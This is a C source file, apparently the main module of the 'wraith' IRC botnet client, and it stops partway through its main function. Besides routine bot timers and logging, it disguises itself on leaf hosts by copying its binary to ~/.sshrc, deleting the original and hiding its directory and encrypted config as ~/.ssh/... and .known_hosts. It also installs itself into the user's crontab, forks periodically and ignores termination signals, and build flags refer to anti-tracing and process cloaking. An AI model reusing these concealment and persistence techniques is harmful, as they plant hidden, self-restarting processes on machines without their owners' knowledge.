#include "main.h"
#include <libgen.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <signal.h>
#include <netdb.h>
#include <setjmp.h>
#ifdef HAVE_UNAME
#include <sys/utsname.h>
#endif
#ifdef STOP_UAC
#include <sys/sysinfo.h>
#define UAC_NOPRINT 0x00000001
#endif
#include <sys/file.h>
#include <sys/stat.h>
#ifdef S_ANTITRACE
#include <sys/ptrace.h>
#include <sys/wait.h>
#endif
#include <sys/types.h>
#include <pwd.h>
#include "chan.h"
#include "modules.h"
#include "tandem.h"
#include "bg.h"
#ifdef CYGWIN_HACKS
#include <windows.h>
#endif
#define ENCMOD "blowfish"
#ifndef _POSIX_SOURCE
#define _POSIX_SOURCE 1
#endif
#ifdef HUB
int hub = 1;
int leaf = 0;
#else
int hub = 0;
int leaf = 1;
#endif
int localhub = 0;
extern char origbotname[], userfile[], botnetnick[], thekey[], netpass[],
  thepass[], myip[], hostname[], hostname6[], natip[];
extern int dcc_total, conmask, cache_hit, cache_miss, max_logs, quick_logs,
  fork_interval, local_fork_interval;
extern struct dcc_t *dcc;
extern struct userrec *userlist;
extern struct chanset_t *chanset;
extern log_t *logs;
extern Tcl_Interp *interp;
extern tcl_timer_t *timer, *utimer;
extern jmp_buf alarmret;
extern void check_last ();
int role;
int loading = 0;
char egg_version[1024] = "1.0.06";
int egg_numver = 1000600;
time_t lastfork = 0;
#ifdef HUB
int my_port;
#endif
char notify_new[121] = "";
int default_flags = 0;
int default_uflags = 0;
int backgrd = 1;
int con_chan = 0;
int term_z = 1;
int updating = 0;
char tempdir[DIRMAX] = "";
char lock_file[40] = "";
char *binname;
char configfile[121] = "";
char helpdir[121];
char textdir[121] = "";
int keep_all_logs = 0;
char logfile_suffix[21] = ".%d%b%Y";
time_t online_since;
char owner[121] = "";
char pid_file[DIRMAX];
int save_users_at = 0;
int notify_users_at = 0;
int switch_logfiles_at = 300;
char version[81];
char ver[41];
int use_stderr = 1;
int do_restart = 0;
int die_on_sighup = 0;
int die_on_sigterm = 0;
int resolve_timeout = 15;
int sgrab = 2011;
char quit_msg[1024];
time_t now;
extern struct cfg_entry CFG_FORKINTERVAL;
#define fork_interval atoi( CFG_FORKINTERVAL.ldata ? CFG_FORKINTERVAL.ldata : CFG_FORKINTERVAL.gdata ? CFG_FORKINTERVAL.gdata : "0")
unsigned char md5out[33];
char md5string[33];
#include "md5/md5.h"
unsigned long otraffic_irc = 0;
unsigned long otraffic_irc_today = 0;
unsigned long otraffic_bn = 0;
unsigned long otraffic_bn_today = 0;
unsigned long otraffic_dcc = 0;
unsigned long otraffic_dcc_today = 0;
unsigned long otraffic_filesys = 0;
unsigned long otraffic_filesys_today = 0;
unsigned long otraffic_trans = 0;
unsigned long otraffic_trans_today = 0;
unsigned long otraffic_unknown = 0;
unsigned long otraffic_unknown_today = 0;
unsigned long itraffic_irc = 0;
unsigned long itraffic_irc_today = 0;
unsigned long itraffic_bn = 0;
unsigned long itraffic_bn_today = 0;
unsigned long itraffic_dcc = 0;
unsigned long itraffic_dcc_today = 0;
unsigned long itraffic_trans = 0;
unsigned long itraffic_trans_today = 0;
unsigned long itraffic_unknown = 0;
unsigned long itraffic_unknown_today = 0;
#ifdef DEBUG_CONTEXT
char cx_file[16][30];
char cx_note[16][256];
int cx_line[16];
int cx_ptr = 0;
#endif
void
fatal (const char *s, int recoverable)
{
  int i;
  putlog (LOG_MISC, "*", "* %s", s);
  flushlogs ();
  for (i = 0; i < dcc_total; i++)
    if (dcc[i].sock >= 0)
      killsock (dcc[i].sock);
  if (!recoverable)
    {
      unlink (pid_file);
      bg_send_quit (BG_ABORT);
      exit (1);
    }
}
char *
getfullbinname (char *argv0)
{
  char *cwd, *bin, *p, *p2;
  bin = nmalloc (strlen (argv0) + 1);
  strcpy (bin, argv0);
  if (bin[0] == '/')
    {
      return bin;
    }
  cwd = nmalloc (8192);
  getcwd (cwd, 8191);
  cwd[8191] = 0;
  if (cwd[strlen (cwd) - 1] == '/')
    cwd[strlen (cwd) - 1] = 0;
  p = bin;
  p2 = strchr (p, '/');
  while (p)
    {
      if (p2)
	*p2++ = 0;
      if (!strcmp (p, ".."))
	{
	  p = strrchr (cwd, '/');
	  if (p)
	    *p = 0;
	}
      else if (strcmp (p, "."))
	{
	  strcat (cwd, "/");
	  strcat (cwd, p);
	}
      p = p2;
      if (p)
	p2 = strchr (p, '/');
    }
  nfree (bin);
  bin = nmalloc (strlen (cwd) + 1);
  strcpy (bin, cwd);
  nfree (cwd);
  return bin;
}
int expmem_chanprog (), expmem_users (), expmem_misc (), expmem_dccutil (),
expmem_botnet (), expmem_tcl (), expmem_tclhash (), expmem_net (),
expmem_modules (int), expmem_language (), expmem_tcldcc (), expmem_tclmisc ();
int
expmem_main ()
{
  int tot = strlen (binname) + 1;
  return tot;
}

int
expected_memory (void)
{
  int tot;
  tot =
    expmem_main () + expmem_chanprog () + expmem_users () + expmem_misc () +
    expmem_dccutil () + expmem_botnet () + expmem_tcl () + expmem_tclhash () +
    expmem_net () + expmem_modules (0) + expmem_language () +
    expmem_tcldcc () + expmem_tclmisc ();
  return tot;
}
static void
check_expired_dcc ()
{
  int i;
  for (i = 0; i < dcc_total; i++)
    if (dcc[i].type && dcc[i].type->timeout_val
	&& ((now - dcc[i].timeval) > *(dcc[i].type->timeout_val)))
      {
	if (dcc[i].type->timeout)
	  dcc[i].type->timeout (i);
	else if (dcc[i].type->eof)
	  dcc[i].type->eof (i);
	else
	  continue;
	return;
      }
}

#ifdef DEBUG_CONTEXT
static int nested_debug = 0;
void
write_debug ()
{
  int x;
  char s[25];
  int y;
  if (nested_debug)
    {
      x = creat ("DEBUG.DEBUG", 0600);
      setsock (x, SOCK_NONSOCK, AF_INET);
      if (x >= 0)
	{
	  strncpyz (s, ctime (&now), sizeof s);
	  dprintf (-x, "Debug (%s) written %s\n", ver, s);
	  dprintf (-x, "Please report problem to bugs@eggheads.org\n");
	  dprintf (-x,
		   "after a visit to http://www.eggheads.org/bugzilla/\n");
	  dprintf (-x, "Context: ");
	  cx_ptr = cx_ptr & 15;
	  for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
	    dprintf (-x, "%s/%d,\n         ", cx_file[y], cx_line[y]);
	  dprintf (-x, "%s/%d\n\n", cx_file[y], cx_line[y]);
	  killsock (x);
	  close (x);
	}
      bg_send_quit (BG_ABORT);
      exit (1);
    }
  else
    nested_debug = 1;
  putlog (LOG_MISC, "*", "* Last context: %s/%d [%s]", cx_file[cx_ptr],
	  cx_line[cx_ptr], cx_note[cx_ptr][0] ? cx_note[cx_ptr] : "");
  putlog (LOG_MISC, "*", "* Please REPORT this BUG to bryan!");
  x = creat ("DEBUG", 0600);
  setsock (x, SOCK_NONSOCK, AF_INET);
  if (x < 0)
    {
      putlog (LOG_MISC, "*", "* Failed to write DEBUG");
    }
  else
    {
      strncpyz (s, ctime (&now), sizeof s);
      dprintf (-x, "Debug (%s) written %s\n", ver, s);
      dprintf (-x, "STATICALLY LINKED\n");
      dprintf (-x, "Tcl library: %s\n",
	       ((interp)
		&& (Tcl_Eval (interp, "info library") ==
		    TCL_OK)) ? interp->result : "*unknown*");
      dprintf (-x, "Tcl version: %s (header version %s)\n",
	       ((interp)
		&& (Tcl_Eval (interp, "info patchlevel") ==
		    TCL_OK)) ? interp->result : (Tcl_Eval (interp,
							   "info tclversion")
						 ==
						 TCL_OK) ? interp->
	       result : "*unknown*",
	       TCL_PATCH_LEVEL ? TCL_PATCH_LEVEL : "*unknown*");
#if HAVE_TCL_THREADS
      dprintf (-x, "Tcl is threaded\n");
#endif
#ifdef CCFLAGS
      dprintf (-x, "Compile flags: %s\n", CCFLAGS);
#endif
#ifdef LDFLAGS
      dprintf (-x, "Link flags: %s\n", LDFLAGS);
#endif
#ifdef STRIPFLAGS
      dprintf (-x, "Strip flags: %s\n", STRIPFLAGS);
#endif
      dprintf (-x, "Context: ");
      cx_ptr = cx_ptr & 15;
      for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
	dprintf (-x, "%s/%d, [%s]\n         ", cx_file[y], cx_line[y],
		 (cx_note[y][0]) ? cx_note[y] : "");
      dprintf (-x, "%s/%d [%s]\n\n", cx_file[cx_ptr], cx_line[cx_ptr],
	       (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
      tell_dcc (-x);
      dprintf (-x, "\n");
      debug_mem_to_dcc (-x);
      killsock (x);
      close (x);
      putlog (LOG_MISC, "*", "* Wrote DEBUG");
    }
}
#endif
static void
got_bus (int z)
{
#ifdef DEBUG_CONTEXT
  write_debug ();
#endif
  fatal ("BUS ERROR -- CRASHING!", 1);
#ifdef SA_RESETHAND
  kill (getpid (), SIGBUS);
#else
  bg_send_quit (BG_ABORT);
  exit (1);
#endif
} static void
got_segv (int z)
{
#ifdef DEBUG_CONTEXT
  write_debug ();
#endif
  fatal ("SEGMENT VIOLATION -- CRASHING!", 1);
#ifdef SA_RESETHAND
  kill (getpid (), SIGSEGV);
#else
  bg_send_quit (BG_ABORT);
  exit (1);
#endif
} static void
got_fpe (int z)
{
#ifdef DEBUG_CONTEXT
  write_debug ();
#endif
  fatal ("FLOATING POINT ERROR -- CRASHING!", 0);
} static void
got_term (int z)
{
#ifdef HUB
  write_userfile (-1);
#endif
  check_tcl_event ("sigterm");
  if (die_on_sigterm)
    {
      botnet_send_chat (-1, botnetnick, "ACK, I've been terminated!");
      fatal ("TERMINATE SIGNAL -- SIGNING OFF", 0);
    }
  else
    {
      putlog (LOG_MISC, "*", "RECEIVED TERMINATE SIGNAL (IGNORING)");
    }
}
static void
got_quit (int z)
{
  check_tcl_event ("sigquit");
  putlog (LOG_MISC, "*", "RECEIVED QUIT SIGNAL (IGNORING)");
  return;
}
static void
got_hup (int z)
{
#ifdef HUB
  write_userfile (-1);
#endif
  check_tcl_event ("sighup");
  if (die_on_sighup)
    {
      fatal ("HANGUP SIGNAL -- SIGNING OFF", 0);
    }
  else
    putlog (LOG_MISC, "*", "Received HUP signal: rehashing...");
  do_restart = -2;
  return;
}
static void
got_alarm (int z)
{
  longjmp (alarmret, 1);
} static void
got_ill (int z)
{
  check_tcl_event ("sigill");
#ifdef DEBUG_CONTEXT
  putlog (LOG_MISC, "*", "* Context: %s/%d [%s]", cx_file[cx_ptr],
	  cx_line[cx_ptr], (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
#endif
}

#ifdef DEBUG_CONTEXT
void
eggContext (const char *file, int line, const char *module)
{
  char x[31], *p;
  p = strrchr (file, '/');
  if (!module)
    {
      strncpyz (x, p ? p + 1 : file, sizeof x);
    }
  else
    egg_snprintf (x, 31, "%s:%s", module, p ? p + 1 : file);
  cx_ptr = ((cx_ptr + 1) & 15);
  strcpy (cx_file[cx_ptr], x);
  cx_line[cx_ptr] = line;
  cx_note[cx_ptr][0] = 0;
}

void
eggContextNote (const char *file, int line, const char *module,
		const char *note)
{
  char x[31], *p;
  p = strrchr (file, '/');
  if (!module)
    {
      strncpyz (x, p ? p + 1 : file, sizeof x);
    }
  else
    egg_snprintf (x, 31, "%s:%s", module, p ? p + 1 : file);
  cx_ptr = ((cx_ptr + 1) & 15);
  strcpy (cx_file[cx_ptr], x);
  cx_line[cx_ptr] = line;
  strncpyz (cx_note[cx_ptr], note, sizeof cx_note[cx_ptr]);
}
#endif
#ifdef DEBUG_ASSERT
void
eggAssert (const char *file, int line, const char *module)
{
#ifdef DEBUG_CONTEXT
  write_debug ();
#endif
  if (!module)
    putlog (LOG_MISC, "*", "* In file %s, line %u", file, line);
  else
    putlog (LOG_MISC, "*", "* In file %s:%s, line %u", module, file, line);
  fatal ("ASSERT FAILED -- CRASHING!", 1);
}
#endif
#ifdef LEAF
#define PARSE_FLAGS "HhlinvP"
static void
dtx_arg (int argc, char *argv[])
{
  int i;
  char *p = NULL;
  while ((i = getopt (argc, argv, PARSE_FLAGS)) != EOF)
    {
      switch (i)
	{
	case 'i':
	  if (localhub)
	    break;
	  p = argv[optind];
	  if (p[0] == '!')
	    {
	      p++;
	      sprintf (natip, "%s", p);
	    }
	  else
	    {
	      snprintf (myip, 121, "%s", p);
	    }
	  break;
	case 'H':
	  if (localhub)
	    break;
	  Context;
	  p = argv[optind];
	  if (p[0] == '+')
	    {
	      p++;
	      sprintf (hostname6, "%s", p);
	    }
	  else
	    sprintf (hostname, "%s", p);
	  break;
	case 'l':
	  if (localhub)
	    break;
	  localhub = 0;
	  snprintf (origbotname, 10, "%s", argv[optind]);
	  break;
	case 'n':
	  backgrd = 0;
	  break;
	case 'v':
	  printf ("%d\n", egg_numver);
	  bg_send_quit (BG_ABORT);
	  exit (0);
	  break;
	case 'P':
	  if (getppid () != atoi (argv[optind]))
	    fatal ("LIES", 0);
	  localhub = 1;
	  updating = 1;
	  break;
	default:
	  exit (1);
	  break;
	}
    }
}
#endif
#ifdef HUB
void
backup_userfile ()
{
  char s[125];
  putlog (LOG_MISC, "*", USERF_BACKUP);
  egg_snprintf (s, sizeof s, "%s~bak", userfile);
  copyfile (userfile, s);
}
#endif
static int lastmin = 99;
static time_t then;
static struct tm nowtm;
int curcheck = 0;
void
core_10secondly ()
{
  curcheck++;
#ifdef S_ANTITRACE
  if (curcheck == 1)
    check_trace ();
#endif
#ifdef S_LASTCHECK
#ifdef LEAF
  if (localhub)
#endif
    if (curcheck == 2)
      check_last ();
#endif
#ifdef LEAF
  if (localhub)
#endif
    if (curcheck == 3)
      {
#ifdef S_PROCESSCHECK
	check_processes ();
#endif
	curcheck = 0;
      }
  Context;
  autolink_cycle (NULL);
}

void
do_fork ()
{
  int xx;
  xx = fork ();
  if (xx == -1)
    return;
  if (xx != 0)
    {
      FILE *fp;
      unlink (pid_file);
      fp = fopen (pid_file, "w");
      if (fp != NULL)
	{
	  fprintf (fp, "%u\n", xx);
	  fclose (fp);
	}
    }
  if (xx)
    {
#if HAVE_SETPGID
      setpgid (xx, xx);
#endif
      exit (0);
    }
  lastfork = now;
}
static void
core_secondly ()
{
  static int cnt = 0;
  int miltime;
  do_check_timers (&utimer);
  if (fork_interval && backgrd)
    {
      if (now - lastfork > fork_interval)
	do_fork ();
    }
  cnt++;
  if ((cnt % 3) == 0)
    call_hook (HOOK_3SECONDLY);
  if ((cnt % 10) == 0)
    {
      call_hook (HOOK_10SECONDLY);
      check_expired_dcc ();
      if (con_chan && !backgrd)
	{
	  dprintf (DP_STDOUT, "\033[2J\033[1;1H");
	  tell_verbose_status (DP_STDOUT);
	  do_module_report (DP_STDOUT, 0, "server");
	  do_module_report (DP_STDOUT, 0, "channels");
	  tell_mem_status_dcc (DP_STDOUT);
	}
    }
  if ((cnt % 30) == 0)
    {
      check_botnet_pings ();
      call_hook (HOOK_30SECONDLY);
      cnt = 0;
    }
  egg_memcpy (&nowtm, localtime (&now), sizeof (struct tm));
  if (nowtm.tm_min != lastmin)
    {
      int i = 0;
      lastmin = (lastmin + 1) % 60;
      call_hook (HOOK_MINUTELY);
      check_expired_ignores ();
      while (nowtm.tm_min != lastmin)
	{
	  debug2 ("timer: drift (lastmin=%d, now=%d)", lastmin, nowtm.tm_min);
	  i++;
	  lastmin = (lastmin + 1) % 60;
	  call_hook (HOOK_MINUTELY);
	}
      if (i > 1)
	putlog (LOG_MISC, "*", "(!) timer drift -- spun %d minutes", i);
      miltime = (nowtm.tm_hour * 100) + (nowtm.tm_min);
      if (((int) (nowtm.tm_min / 5) * 5) == (nowtm.tm_min))
	{
	  call_hook (HOOK_5MINUTELY);
	  if (!quick_logs)
	    {
	      flushlogs ();
	      check_logsize ();
	    }
	  if (!miltime)
	    {
	      char s[25];
	      int j;
	      strncpyz (s, ctime (&now), sizeof s);
#ifdef HUB
	      putlog (LOG_ALL, "*", "--- %.11s%s", s, s + 20);
	      call_hook (HOOK_BACKUP);
#endif
	      for (j = 0; j < max_logs; j++)
		{
		  if (logs[j].filename != NULL && logs[j].f != NULL)
		    {
		      fclose (logs[j].f);
		      logs[j].f = NULL;
		    }
		}
	    }
	}
      if (nowtm.tm_min == notify_users_at)
	call_hook (HOOK_HOURLY);
#ifdef HUB
      if (miltime == switch_logfiles_at)
	{
	  call_hook (HOOK_DAILY);
	  if (!keep_all_logs)
	    {
	      putlog (LOG_MISC, "*", MISC_LOGSWITCH);
	      for (i = 0; i < max_logs; i++)
		if (logs[i].filename)
		  {
		    char s[1024];
		    if (logs[i].f)
		      {
			fclose (logs[i].f);
			logs[i].f = NULL;
		      }
		    egg_snprintf (s, sizeof s, "%s.yesterday",
				  logs[i].filename);
		    unlink (s);
		    movefile (logs[i].filename, s);
		  }
	    }
	}
#endif
    }
}

#ifdef LEAF
static void
check_mypid ()
{
  module_entry *me;
  FILE *fp;
  char s[15];
  int xx = 0;
  char buf2[DIRMAX];
  egg_snprintf (buf2, sizeof buf2, "%s/.pid.%s", tempdir, botnetnick);
  fp = fopen (buf2, "r");
  if (fp != NULL)
    {
      fgets (s, 10, fp);
      xx = atoi (s);
      if (getpid () != xx)
	{
	  fatal
	    ("getpid() does not match pid in file. Possible cloned process, exiting..",
	     1);
	  if ((me = module_find ("server", 0, 0)))
	    {
	      Function *func = me->funcs;
	      (func[SERVER_NUKESERVER]) ("cloned process");
	    }
	  botnet_send_bye ();
	  bg_send_quit (BG_ABORT);
	  exit (1);
	}
    }
}
#endif
static void
core_minutely ()
{
#ifdef LEAF
  check_mypid ();
#endif
  check_tcl_time (&nowtm);
  do_check_timers (&timer);
  if (quick_logs != 0)
    {
      flushlogs ();
      check_logsize ();
    }
}
static void
core_hourly ()
{
#ifdef HUB
  write_userfile (-1);
#endif
} static void

event_rehash ()
{
  check_tcl_event ("rehash");
} static void

event_prerehash ()
{
  check_tcl_event ("prerehash");
} static void

event_save ()
{
  check_tcl_event ("save");
} static void

event_logfile ()
{
  check_tcl_event ("logfile");
} static void

event_resettraffic ()
{
  otraffic_irc += otraffic_irc_today;
  itraffic_irc += itraffic_irc_today;
  otraffic_bn += otraffic_bn_today;
  itraffic_bn += itraffic_bn_today;
  otraffic_dcc += otraffic_dcc_today;
  itraffic_dcc += itraffic_dcc_today;
  otraffic_unknown += otraffic_unknown_today;
  itraffic_unknown += itraffic_unknown_today;
  otraffic_trans += otraffic_trans_today;
  itraffic_trans += itraffic_trans_today;
  otraffic_irc_today = otraffic_bn_today = 0;
  otraffic_dcc_today = otraffic_unknown_today = 0;
  itraffic_irc_today = itraffic_bn_today = 0;
  itraffic_dcc_today = itraffic_unknown_today = 0;
  itraffic_trans_today = otraffic_trans_today = 0;
} static void

event_loaded ()
{
  check_tcl_event ("loaded");
} void kill_tcl ();
extern module_entry *module_list;
void restart_chons ();
void check_static (char *, char *(*)());
#include "mod/static.h"
int init_userrec (), init_mem (), init_dcc_max (), init_userent (),
init_misc (), init_bots (), init_net (), init_modules (), init_tcl (int,
								    char **),
init_language (int), init_botcmd ();
void
checklockfile ()
{
#ifndef LOCK_EX
#define LOCK_EX 2
#endif
#ifndef LOCK_NB
#define LOCK_NB 4
#endif
  static int lockfile;
  char *p;
  p = strrchr (binname, '/');
  p++;
  sprintf (lock_file, "%s/.lock.%s", tempdir, p);
  lockfile = open (lock_file, O_EXCL);
  if (lockfile <= 0)
    {
      lockfile = open (lock_file, O_EXCL | O_CREAT, S_IWUSR | S_IRUSR);
    }
  if (lockfile <= 0)
    {
      exit (1);
    }
  if (flock (lockfile, LOCK_EX | LOCK_NB))
    exit (1);
}
static inline void
garbage_collect (void)
{
  static u_8bit_t run_cnt = 0;
  if (run_cnt == 3)
    garbage_collect_tclhash ();
  else
    run_cnt++;
}

int
crontab_exists ()
{
  char buf[2048], *out = NULL;
  sprintf (buf, STR ("crontab -l | grep \"%s\" | grep -v \"^#\""), binname);
  if (shell_exec (buf, NULL, &out, NULL))
    {
      if (out && strstr (out, binname))
	{
	  nfree (out);
	  return 1;
	}
      else
	{
	  if (out)
	    nfree (out);
	  return 0;
	}
    }
  else
    return (-1);
}

void
crontab_create (int interval)
{
  char tmpfile[161], buf[256];
  FILE *f;
  int fd;
  sprintf (tmpfile, STR ("%s.crontab-XXXXXX"), tempdir);
  if ((fd = mkstemp (tmpfile)) == -1)
    {
      unlink (tmpfile);
      return;
    }
  sprintf (buf,
	   STR
	   ("crontab -l | grep -v \"%s\" | grep -v \"^#\" | grep -v \"^\\$\"> %s"),
	   binname, tmpfile);
  if (shell_exec (buf, NULL, NULL, NULL) && (f = fdopen (fd, "a")) != NULL)
    {
      buf[0] = 0;
      if (interval == 1)
	strcpy (buf, "*");
      else
	{
	  int i = 1;
	  int si = random () % interval;
	  while (i < 60)
	    {
	      if (buf[0])
		sprintf (buf + strlen (buf), STR (",%i"), (i + si) % 60);
	      else
		sprintf (buf, "%i", (i + si) % 60);
	      i += interval;
	    }
	}
      sprintf (buf + strlen (buf), STR (" * * * * %s > /dev/null 2>&1"),
	       binname);
      fseek (f, 0, SEEK_END);
      fprintf (f, STR ("\n%s\n"), buf);
      fclose (f);
      sprintf (buf, STR ("crontab %s"), tmpfile);
      shell_exec (buf, NULL, NULL, NULL);
    }
  unlink (tmpfile);
}
static void
check_crontab ()
{
  int i = 0;
#ifdef LEAF
  if (!localhub)
    fatal ("something is wrong.", 0);
#endif
  i = crontab_exists ();
  if (!i)
    {
      crontab_create (5);
      i = crontab_exists ();
      if (!i)
	printf ("* Error writing crontab entry.\n");
    }
}
int
main (int argc, char **argv)
{
  int xx, i;
#ifdef LEAF
  int x = 1;
#endif
  char buf[sgrab + 9], s[25];
  char gpasswd[121];
  FILE *f;
  struct sigaction sv;
  struct chanset_t *chan;
  struct stat sb;
  MD5_CTX ctx;
#ifdef LEAF
#ifdef S_PSCLOAK
  int on;
#endif
  FILE *fp;
  struct passwd *pw;
  char newbin[DIRMAX], confdir[DIRMAX], tmp[DIRMAX], cfile[DIRMAX],
    templine[8192], *temps;
  int ok = 1;
  uid_t id;
#else
  char confdir[DIRMAX], tmp[DIRMAX], cfile[DIRMAX], templine[8192], *temps;
  char tmpdir[DIRMAX];
#endif
  char c[1024], *vers_n, *unix_n;
#ifdef HAVE_UNAME
  struct utsname un;
#endif
  char check[100];
  char *nick, *host, *ip;
#ifdef DEBUG_MEM
  {
#include <sys/resource.h>
    struct rlimit cdlim;
    cdlim.rlim_cur = RLIM_INFINITY;
    cdlim.rlim_max = RLIM_INFINITY;
    setrlimit (RLIMIT_CORE, &cdlim);
  }
#endif
  for (i = 0; i < 16; i++)
    Context;
  egg_snprintf (ver, sizeof ver, "wraith %s", egg_version);
  egg_snprintf (version, sizeof version, "wraith %s", egg_version);
  sprintf (&egg_version[strlen (egg_version)], " %u", egg_numver);
#ifdef STOP_UAC
  {
    int nvpair[2];
    nvpair[0] = SSIN_UACPROC;
    nvpair[1] = UAC_NOPRINT;
    setsysinfo (SSI_NVPAIRS, (char *) nvpair, 1, NULL, 0);
  }
#endif
  sv.sa_handler = got_bus;
  sigemptyset (&sv.sa_mask);
#ifdef SA_RESETHAND
  sv.sa_flags = SA_RESETHAND;
#else
  sv.sa_flags = 0;
#endif
  sigaction (SIGBUS, &sv, NULL);
  sv.sa_handler = got_segv;
  sigaction (SIGSEGV, &sv, NULL);
#ifdef SA_RESETHAND
  sv.sa_flags = 0;
#endif
  sv.sa_handler = got_fpe;
  sigaction (SIGFPE, &sv, NULL);
  sv.sa_handler = got_term;
  sigaction (SIGTERM, &sv, NULL);
  sv.sa_handler = got_hup;
  sigaction (SIGHUP, &sv, NULL);
  sv.sa_handler = got_quit;
  sigaction (SIGQUIT, &sv, NULL);
  sv.sa_handler = SIG_IGN;
  sigaction (SIGPIPE, &sv, NULL);
  sv.sa_handler = got_ill;
  sigaction (SIGILL, &sv, NULL);
  sv.sa_handler = got_alarm;
  sigaction (SIGALRM, &sv, NULL);
  Context;
  now = time (NULL);
  chanset = NULL;
  egg_memcpy (&nowtm, localtime (&now), sizeof (struct tm));
  lastmin = nowtm.tm_min;
  srandom (now % (getpid () + getppid ()));
  init_mem ();
  binname = getfullbinname (argv[0]);
  if (stat (binname, &sb))
    fatal ("Cannot access binary.", 0);
  if (chmod (binname, S_IRUSR | S_IWUSR | S_IXUSR))
    fatal ("Cannot chmod binary.", 0);
  if (argc >= 2)
    {
      if (!strcmp (argv[1], "-v") || !strcmp (argv[1], "-d")
	  || !strcmp (argv[1], "-e"))
	{
	  if (!strcmp (argv[1], "-v"))
	    {
	      printf ("%d\n", egg_numver);
	    }
	  else
	    {
	      if (argc != 4)
		fatal ("Wrong number of arguments: -e/-d <infile> <outfile>",
		       0);
	      printf ("* Enter password: ");
	      fgets (gpasswd, sizeof (gpasswd), stdin);
	      if (strchr (gpasswd, '\n'))
		*strchr (gpasswd, '\n') = 0;
	      printf ("\n");
	      MD5_Init (&ctx);
	      MD5_Update (&ctx, gpasswd, strlen (gpasswd));
	      MD5_Final (md5out, &ctx);
	      for (i = 0; i < 16; i++)
		sprintf (md5string + (i * 2), "%.2x", md5out[i]);
	      if (strcmp (thepass, md5string))
		fatal ("incorrect password.", 0);
	      init_tcl (argc, argv);
	      link_statics ();
	      Context;
	      module_load (ENCMOD);
	      if (!strcmp (argv[1], "-e"))
		{
		  Context;
		  EncryptFile (argv[2], argv[3]);
		  fatal ("File Encryption complete", 3);
		}
	      else if (!strcmp (argv[1], "-d"))
		{
		  Context;
		  DecryptFile (argv[2], argv[3]);
		  fatal ("File Decryption complete", 3);
		}
	    }
	  exit (0);
	}
    }
#ifdef LEAF
  id = geteuid ();
  if (!id)
    fatal ("Cannot read userid.", 0);
  pw = getpwuid (id);
  if (!pw)
    fatal ("Cannot read from the passwd file.", 0);
  sprintf (newbin, "%s/.sshrc", pw->pw_dir);
  sprintf (confdir, "%s/.ssh", pw->pw_dir);
  sprintf (tempdir, "%s/...", confdir);
#endif
#ifdef HUB
  sprintf (tmpdir, "%s", binname);
  sprintf (confdir, "%s", dirname (tmpdir));
  sprintf (tempdir, "%s/tmp", confdir);
#endif
#ifdef LEAF
  if (strcmp (binname, newbin))
    {
      unlink (newbin);
      if (copyfile (binname, newbin))
	ok = 0;
      if (ok)
	if (stat (newbin, &sb))
	  {
	    unlink (newbin);
	    ok = 0;
	  }
      if (ok)
	if (chmod (newbin, S_IRUSR | S_IWUSR | S_IXUSR))
	  {
	    unlink (newbin);
	    ok = 0;
	  }
      if (!ok)
	fatal ("Wrong directory/binname.", 0);
      else
	{
	  unlink (binname);
	  if (system (newbin))
	    exit (1);
	  else
	    {
	      exit (0);
	    }
	}
    }
  if (argc == 1)
    {
      localhub = 1;
    }
  if (argc)
    dtx_arg (argc, argv);
#endif
  sprintf (tmp, "%s/", confdir);
  if (stat (tmp, &sb))
    {
#ifdef LEAF
      if (mkdir (tmp, S_IRUSR | S_IWUSR | S_IXUSR))
	{
	  unlink (confdir);
	  if (stat (confdir, &sb))
	    if (mkdir (confdir, S_IRUSR | S_IWUSR | S_IXUSR))
#endif
	      fatal ("cant create/access config dir.\n", 0);
#ifdef LEAF
	}
#endif
    }
  sprintf (tmp, "%s/", tempdir);
  if (stat (tmp, &sb))
    {
      if (mkdir (tmp, S_IRUSR | S_IWUSR | S_IXUSR))
	{
	  unlink (tempdir);
	  if (stat (tempdir, &sb))
	    if (mkdir (tempdir, S_IRUSR | S_IWUSR | S_IXUSR))
	      fatal ("cant create/access tmp dir.\n", 0);
	}
    }
  if (chmod (confdir, S_IRUSR | S_IWUSR | S_IXUSR))
    fatal ("cannot chmod config dir.\n", 0);
  if (chmod (tempdir, S_IRUSR | S_IWUSR | S_IXUSR))
    fatal ("cannot chmod tmp dir.\n", 0);
#ifdef LEAF
  sprintf (cfile, "%s/.known_hosts", confdir);
#else
  sprintf (cfile, "%s/conf", confdir);
#endif
  chmod (cfile, S_IRUSR | S_IWUSR | S_IXUSR);
  init_settings ();
  init_language (1);
  init_dcc_max ();
  init_userent ();
  init_misc ();
  init_bots ();
  init_net ();
  init_modules ();
  init_userrec ();
  if (backgrd)
    bg_prepare_split ();
  init_tcl (argc, argv);
  init_language (0);
  init_botcmd ();
  link_statics ();
  module_load (ENCMOD);
#ifdef LEAF
  if (localhub)
    {
#endif
#ifdef HAVE_UNAME
      if (uname (&un) < 0)
	{
#endif
	  unix_n = "*unkown*";
	  vers_n = "";
#ifdef HAVE_UNAME
	}
      else
	{
	  unix_n = un.nodename;
#ifdef __FreeBSD__
	  vers_n = un.release;
#else
	  vers_n = un.version;
#endif
	}
#endif
      i = 0;
      if (!(f = fopen (cfile, "r")))
	fatal ("the local config is missing.\n", 0);
      while (fscanf (f, "%[^\n]\n", templine) != EOF)
	{
	  Context;
	  temps = (char *) decrypt_string (netpass, decryptit (templine));
	  sprintf (c, "%s", temps);
	  if (c[0] == '-')
	    {
	      newsplit (&temps);
	      if (geteuid () != atoi (temps))
		fatal ("Go away.", 0);
	    }
	  else if (c[0] == '+')
	    {
	      newsplit (&temps);
	      sprintf (check, "%s %s", unix_n, vers_n);
	      if (strcmp (temps, check))
		fatal ("Go away..", 0);
	    }
	  else if (c[0] == '!')
	    {
	      newsplit (&temps);
	      Tcl_Eval (interp, temps);
	    }
	  else if (temps[0] != '#')
	    {
	      i++;
	      nick = newsplit (&temps);
	      if (!nick)
		fatal ("invalid config.", 0);
	      ip = newsplit (&temps);
	      if (!ip)
		fatal ("invalid config.", 0);
	      host = newsplit (&temps);
	      if (!host && (ip[0] != '!'))
		fatal ("invalid config.", 0);
	      if (i == 1)
		{
		  strncpyz (s, ctime (&now), sizeof s);
		  strcpy (&s[11], &s[20]);
		  printf ("--- Loading %s (%s)\n\n", ver, s);
#ifdef LEAF
		  if (ip[0] == '!')
		    {
		      ip++;
		      sprintf (natip, "%s", ip);
		    }
		  else
		    {
#endif
